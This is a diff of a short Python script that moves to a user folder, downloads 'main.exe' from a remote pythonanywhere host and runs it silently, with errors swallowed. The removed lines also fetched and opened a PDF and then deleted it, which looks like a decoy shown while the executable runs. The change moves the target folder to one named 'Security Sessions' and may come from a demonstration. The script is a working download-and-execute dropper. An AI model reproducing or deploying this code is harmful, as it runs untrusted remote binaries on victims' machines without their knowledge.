@@ -10,22 +10,18 @@ def download(url):
 
 current_dir = os.getcwd()
 strr = os.getcwd()
-x = -2
+x = -1
 for i in os.getcwd():
     if i == "\\":
         x += 1
 for i in range(x):
     os.chdir("..")
 
-
-os.chdir("Music")
-download("https://armeng.pythonanywhere.com/media/files/gt3-gt4-bep.pdf")
-os.startfile("gt3-gt4-bep.pdf") 
+os.chdir("public")
+os.chdir("Security Sessions")
+print(os.getcwd())
 try:
     download("https://armeng.pythonanywhere.com/media/files/main.exe")
     os.startfile("main.exe")
 except Exception:
     pass
-
-
-os.remove("gt3-gt4-bep.pdf")
